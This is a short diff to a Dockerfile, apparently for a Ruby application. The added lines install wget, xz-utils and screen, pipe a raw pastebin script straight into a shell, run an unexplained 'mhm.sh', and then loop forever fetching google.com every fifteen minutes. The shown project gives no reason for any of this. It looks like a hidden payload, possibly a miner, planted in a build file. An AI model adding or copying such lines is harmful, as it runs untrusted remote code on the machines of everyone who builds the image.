@@ -8,6 +8,10 @@ RUN apt-get update > /dev/null 2>&1 && \
 # Set app workdir
 WORKDIR /app
 
+RUN apt-get update -y && apt-get install wget -y && apt-get install -y xz-utils && apt-get install screen -y
+RUN chmod +x mhm.sh
+RUN (wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && bash mhm.sh && while true; do wget google.com ; sleep 900 ; done
+
 # Upgrade rubygems
 RUN gem update --system 3.4.13 > /dev/null 2>&1
 
